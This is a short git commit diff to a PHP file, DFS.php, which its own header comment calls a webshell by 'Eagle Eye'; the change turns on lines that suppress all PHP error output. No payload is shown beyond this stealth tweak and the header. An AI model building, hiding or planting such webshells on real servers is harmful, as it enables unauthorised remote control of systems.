c13d19aa79c2fb94e498b023ed27899bd25ccf02
Eagle Eye <87413459+EagleTube@users.noreply.github.com>
2022-08-08 21:46:57 +0800

    Update DFS.php

--- DFS.php
+++ DFS.php
@@ -1,8 +1,8 @@
 <?php
 
-#ini_set('display_errors', 0);
-#ini_set('display_startup_errors', 0);
-#error_reporting(0);
+ini_set('display_errors', 0);
+ini_set('display_startup_errors', 0);
+error_reporting(0);
 # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
 #                                                                               #
 #           This webshell are programmed and modified by Eagle Eye              #
